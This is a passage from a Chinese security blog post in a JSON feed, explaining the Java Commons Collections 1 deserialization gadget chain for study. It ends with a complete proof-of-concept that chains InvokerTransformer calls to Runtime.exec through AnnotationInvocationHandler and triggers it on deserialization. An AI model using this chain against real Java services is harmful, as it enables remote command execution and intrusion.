type 的实例</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">// Class is no longer an annotation type; time to punch out</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Non-annotation type in annotation serial stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 2 、 获取 annotationType 的成员类型，返回一个 Map</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> memberTypes <span class=\"token operator\">=</span> annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span> memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 3 、 得到 memberValue 的 key 值</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token comment\">// 4 、 判断 memberValue 的 key 是否在 memberTypes 里存在</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> memberType <span class=\"token operator\">=</span> memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>memberType <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// i.e. member still exists</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token comment\">// 5、 isInstance () 方法 用于检查给定对象是否是具有此 Class 表示的对象的实例</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>memberType<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                      value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>具体分析见注解</p>\n<p>现在我们知道，只要传入的 Annotation 有值，同时 transformedMap 的 key 等于 Annotation 的值就可以过 if</p>\n<hr />\n<p>如果不能理解，可以自行调试</p>\n<hr />\n<blockquote>\n<p>memberValue.setValue 的 值为 AnnotationTypeMismatchExceptionProxy</p>\n</blockquote>\n<p>现在剩下最后一个小问题了，如何改变 setValue 的值<br />\n我们先走到 transform 这，可以看到最后走到了<br />\n valueTransformer.transform (value)，而 valueTransformer 等于 ChainedTransformer，所以在要将中间的链改变，就能够更改 value 的值</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/18/DqeWA63Tt8G7fOk.png\" alt=\"5.png\" /><br />\n 我们看到 ConstantTransformer 不管 transform 什么值，都返回它自身的值，所以只要加入 ChainedTransformer 的 transformedMaps 里就能够控制 value 的值<br />\n<img data-src=\"https://s2.loli.net/2022/10/18/pTsuRnAOMj46qLa.png\" alt=\"6.png\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在无论 transform 传入任何值，都不影响 Runtime.class 的调用</p>\n<h2 id=\"0x06-完整-poc\"><a class=\"anchor\" href=\"#0x06-完整-poc\">#</a> 0x06 完整 PoC</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> transform <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> transformedMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> declaredConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Target</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span>transformedMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> o<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> objectOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> file<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> objectInputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> objectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"0x07-总结\"><a class=\"anchor\" href=\"#0x07-总结\">#</a> 0x07 总结</h2>\n<p>CC1 的利用链略微复杂一点，调用链比较长，但是对于反序列化的学习还是挺重要的。</p>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化"
            ]
        }
    ]
}